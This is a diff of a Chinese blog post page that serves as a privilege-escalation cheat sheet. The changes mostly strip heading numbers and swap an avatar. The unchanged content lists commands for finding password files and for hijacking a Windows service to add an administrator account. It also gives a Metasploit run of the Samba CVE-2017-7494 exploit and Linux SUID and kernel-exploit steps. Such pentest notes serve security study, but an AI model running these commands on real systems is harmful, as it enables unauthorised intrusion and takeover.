@@ -88,18 +88,18 @@
 
 
 
-<meta name="description" content="0x01 常见信息收集">
+<meta name="description" content="常见信息收集">
 <meta name="keywords" content="笔记,域渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域渗透(提权篇)">
 <meta property="og:url" content="https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/index.html">
 <meta property="og:site_name" content="Sparrow&#39;s Blog">
-<meta property="og:description" content="0x01 常见信息收集">
+<meta property="og:description" content="常见信息收集">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-28T01:36:17.679Z">
+<meta property="og:updated_time" content="2018-03-28T07:20:16.853Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透(提权篇)">
-<meta name="twitter:description" content="0x01 常见信息收集">
+<meta name="twitter:description" content="常见信息收集">
 
 
 
@@ -311,7 +311,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sparrow">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/jacksparrow.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -421,7 +421,7 @@
       
 
       
-        <h2 id="0x01-常见信息收集"><a href="#0x01-常见信息收集" class="headerlink" title="0x01 常见信息收集"></a>0x01 常见信息收集</h2><a id="more"></a>
+        <h2 id="常见信息收集"><a href="#常见信息收集" class="headerlink" title="常见信息收集"></a>常见信息收集</h2><a id="more"></a>
 <pre><code>dir /a-r-d /s /b                                 检查文件夹可写状态
 dir /b/s password.txt                            查找密码文件或其它敏感文件
 dir /b/s config.*
@@ -444,7 +444,7 @@ systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;
 schtasks /query /fo LIST /v                      计划任务 [国外调整 chcp 437]
 route print                                      查看路由表
 arp -A                                           查看ARP缓存
-</code></pre><h2 id="0x02-upnphost提权"><a href="#0x02-upnphost提权" class="headerlink" title="0x02 upnphost提权"></a>0x02 upnphost提权</h2><pre><code>sc qc Spooler                 查询，配置，和管理Windows服务
+</code></pre><h2 id="upnphost提权"><a href="#upnphost提权" class="headerlink" title="upnphost提权"></a>upnphost提权</h2><pre><code>sc qc Spooler                 查询，配置，和管理Windows服务
 accesschk.exe -ucqv Spooler   检查每个服务需要的权限   XP_SP2被修复
 攻击手法：
     sc qc upnphost
@@ -459,7 +459,7 @@ accesschk.exe -ucqv Spooler   检查每个服务需要的权限   XP_SP2被修�
     sc config PFNET binpath= &quot;net localgroup Administrators admin /add&quot;
     sc stop PFNET
     sc start PFNET
-</code></pre><h2 id="0x03-服务与权限"><a href="#0x03-服务与权限" class="headerlink" title="0x03 服务与权限"></a>0x03 服务与权限</h2><pre><code>DRIVERQUERY                 安装驱动
+</code></pre><h2 id="服务与权限"><a href="#服务与权限" class="headerlink" title="服务与权限"></a>服务与权限</h2><pre><code>DRIVERQUERY                 安装驱动
 wmic product list brief     查看安装程序和版本信息. [可能存在漏洞]
 wmic service list brief     查看服务、进程和启动程序信息
 wmic process list brief
@@ -470,7 +470,7 @@ wimc process where(description=&quot;进程名&quot;)       结合tasklist /svc
 wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;    列出目标机器上所有没有用引号包含的服务路径
 tasklist /v /fo list /fi &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot;  筛选NT AUTHORITY\SYSTEM权限进程
 icacls &quot;C:\Program Files (x86)\360&quot;     查看路径中受影响文件夹的权限
-</code></pre><h2 id="0x04-补丁对应Exp"><a href="#0x04-补丁对应Exp" class="headerlink" title="0x04 补丁对应Exp"></a>0x04 补丁对应Exp</h2><p>补丁对比 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+</code></pre><h2 id="补丁对应Exp"><a href="#补丁对应Exp" class="headerlink" title="补丁对应Exp"></a>补丁对应Exp</h2><p>补丁对比 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
 <pre><code>pip install xlrd --upgrade
 ./windows-exploit-suggester.py --update
 [+] writing to file 2014-06-06-mssb.xlsx 
@@ -478,15 +478,15 @@ icacls &quot;C:\Program Files (x86)\360&quot;     查看路径中受影响文件
 ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo     win7sp1-systeminfo.txt 
 未修补漏洞存在的exp
 ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext     &#39;windows server 2008 r2&#39;
-</code></pre><h2 id="0x05-AlwaysInstallElevated提权"><a href="#0x05-AlwaysInstallElevated提权" class="headerlink" title="0x05 AlwaysInstallElevated提权"></a>0x05 AlwaysInstallElevated提权</h2><pre><code>http://www.greyhathacker.net/?p=185
+</code></pre><h2 id="AlwaysInstallElevated提权"><a href="#AlwaysInstallElevated提权" class="headerlink" title="AlwaysInstallElevated提权"></a>AlwaysInstallElevated提权</h2><pre><code>http://www.greyhathacker.net/?p=185
 如果这个设置被启用，它允许任何权限的用户暂时使用NT AUTHORITY\SYSTEM权限来安装*.msi文件。
 AlwaysInstallElevated且它的DWORD值是1才有效。
 https://github.com/SecWiki/windows-kernel-exploits
 https://github.com/SecWiki/linux-kernel-exploits
 可以利用Advanced Installer(http://www.advancedinstaller.com/)生成msi安装包
-</code></pre><h2 id="0x06-查看-msi程序的执行权限"><a href="#0x06-查看-msi程序的执行权限" class="headerlink" title="0x06 查看.msi程序的执行权限"></a>0x06 查看.msi程序的执行权限</h2><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre><h2 id="查看-msi程序的执行权限"><a href="#查看-msi程序的执行权限" class="headerlink" title="查看.msi程序的执行权限"></a>查看.msi程序的执行权限</h2><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-</code></pre><h2 id="0x07-查看是否设置有setuid和setgid"><a href="#0x07-查看是否设置有setuid和setgid" class="headerlink" title="0x07 查看是否设置有setuid和setgid"></a>0x07 查看是否设置有setuid和setgid</h2><pre><code>reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits
+</code></pre><h2 id="查看是否设置有setuid和setgid"><a href="#查看是否设置有setuid和setgid" class="headerlink" title="查看是否设置有setuid和setgid"></a>查看是否设置有setuid和setgid</h2><pre><code>reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits
 
 CVE-2017-1000367
     系统必须启用selinux
@@ -495,18 +495,18 @@ CVE-2017-1000367
 gcc -o sudopwn sudopwn.c -lutil
 ./sudopwn
 </code></pre><p>枚举系统设置和权限的检查<br><a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">http://www.securitysift.com/download/linuxprivchecker.py</a></p>
-<h2 id="0x08-基于操作系统的内核版本号"><a href="#0x08-基于操作系统的内核版本号" class="headerlink" title="0x08 基于操作系统的内核版本号"></a>0x08 基于操作系统的内核版本号</h2><pre><code>https://github.com/PenturaLabs/Linux_Exploit_Suggester
+<h2 id="基于操作系统的内核版本号"><a href="#基于操作系统的内核版本号" class="headerlink" title="基于操作系统的内核版本号"></a>基于操作系统的内核版本号</h2><pre><code>https://github.com/PenturaLabs/Linux_Exploit_Suggester
 ./Linux_Exploit_Suggester.pl -k 内核版本号[例如3.10,结合uname -a]
-</code></pre><h2 id="0x09-检测权限提升向量的shell脚本"><a href="#0x09-检测权限提升向量的shell脚本" class="headerlink" title="0x09 检测权限提升向量的shell脚本"></a>0x09 检测权限提升向量的shell脚本</h2><pre><code>https://github.com/pentestmonkey/unix-privesc-check
+</code></pre><h2 id="检测权限提升向量的shell脚本"><a href="#检测权限提升向量的shell脚本" class="headerlink" title="检测权限提升向量的shell脚本"></a>检测权限提升向量的shell脚本</h2><pre><code>https://github.com/pentestmonkey/unix-privesc-check
 unix-privesc-check standard
 unix-privesc-check detailed
 </code></pre><p>下载和解压缩脚本RootHelper<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="noopener">https://github.com/NullArray/RootHelper</a></p>
-<h2 id="0x10-CVE-2017-7494-Samba"><a href="#0x10-CVE-2017-7494-Samba" class="headerlink" title="0x10 CVE-2017-7494[Samba]"></a>0x10 CVE-2017-7494[Samba]</h2><pre><code>http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/
+<h2 id="CVE-2017-7494-Samba"><a href="#CVE-2017-7494-Samba" class="headerlink" title="CVE-2017-7494[Samba]"></a>CVE-2017-7494[Samba]</h2><pre><code>http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/
 use exploit/linux/samba/is_known_pipename
 set RHOST 192.168.232.137
 set target 3
 exploit
-</code></pre><h2 id="0x11-内核提权"><a href="#0x11-内核提权" class="headerlink" title="0x11 内核提权"></a>0x11 内核提权</h2><pre><code>lsb_release -a
+</code></pre><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><pre><code>lsb_release -a
 uname -a
 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
 suid 提权 [有限制]
@@ -626,7 +626,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image"
-                src="/images/jacksparrow.png"
+                src="/images/avatar.gif"
                 alt="Sparrow" />
             
               <p class="site-author-name" itemprop="name">Sparrow</p>
@@ -718,7 +718,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-常见信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x01 常见信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-upnphost提权"><span class="nav-number">2.</span> <span class="nav-text">0x02 upnphost提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-服务与权限"><span class="nav-number">3.</span> <span class="nav-text">0x03 服务与权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-补丁对应Exp"><span class="nav-number">4.</span> <span class="nav-text">0x04 补丁对应Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-AlwaysInstallElevated提权"><span class="nav-number">5.</span> <span class="nav-text">0x05 AlwaysInstallElevated提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-查看-msi程序的执行权限"><span class="nav-number">6.</span> <span class="nav-text">0x06 查看.msi程序的执行权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-查看是否设置有setuid和setgid"><span class="nav-number">7.</span> <span class="nav-text">0x07 查看是否设置有setuid和setgid</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-基于操作系统的内核版本号"><span class="nav-number">8.</span> <span class="nav-text">0x08 基于操作系统的内核版本号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-检测权限提升向量的shell脚本"><span class="nav-number">9.</span> <span class="nav-text">0x09 检测权限提升向量的shell脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-CVE-2017-7494-Samba"><span class="nav-number">10.</span> <span class="nav-text">0x10 CVE-2017-7494[Samba]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-内核提权"><span class="nav-number">11.</span> <span class="nav-text">0x11 内核提权</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#常见信息收集"><span class="nav-number">1.</span> <span class="nav-text">常见信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upnphost提权"><span class="nav-number">2.</span> <span class="nav-text">upnphost提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务与权限"><span class="nav-number">3.</span> <span class="nav-text">服务与权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补丁对应Exp"><span class="nav-number">4.</span> <span class="nav-text">补丁对应Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AlwaysInstallElevated提权"><span class="nav-number">5.</span> <span class="nav-text">AlwaysInstallElevated提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看-msi程序的执行权限"><span class="nav-number">6.</span> <span class="nav-text">查看.msi程序的执行权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看是否设置有setuid和setgid"><span class="nav-number">7.</span> <span class="nav-text">查看是否设置有setuid和setgid</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于操作系统的内核版本号"><span class="nav-number">8.</span> <span class="nav-text">基于操作系统的内核版本号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检测权限提升向量的shell脚本"><span class="nav-number">9.</span> <span class="nav-text">检测权限提升向量的shell脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-7494-Samba"><span class="nav-number">10.</span> <span class="nav-text">CVE-2017-7494[Samba]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内核提权"><span class="nav-number">11.</span> <span class="nav-text">内核提权</span></a></li></ol></div>
             
 
           </div>
